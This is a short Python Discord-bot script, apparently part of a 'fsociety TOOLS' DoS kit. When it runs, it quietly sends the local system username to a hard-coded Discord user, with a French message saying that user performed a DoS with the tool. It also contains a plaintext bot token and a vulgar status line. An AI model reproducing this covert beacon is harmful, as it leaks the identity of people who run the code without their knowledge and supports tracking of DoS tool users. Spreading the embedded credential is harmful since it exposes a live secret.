try:
  import discord
  from discord.ext import commands
  import getpass
except:
   import os
   os.system('pip install discord')
   import discord
   from discord.ext import commands

intents = discord.Intents.all()
intents.members = True
intents.presences = True  

bot = commands.Bot(command_prefix='!', intents=intents)
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    await bot.change_presence(activity=discord.Game('baisé des mamans'))
    target_user = bot.get_user(515843202595422258)
    if target_user:
        await target_user.send(f'**{getpass.getuser()}** a dos avec **fsociety TOOLS** !')
bot.run('MTE3NzAxMDQwNjQzMTEyOTY0MA.GVIFco.jvAJyJ0BkLh5ty6z50ImfUoWJUf1PSmeAIlllc')
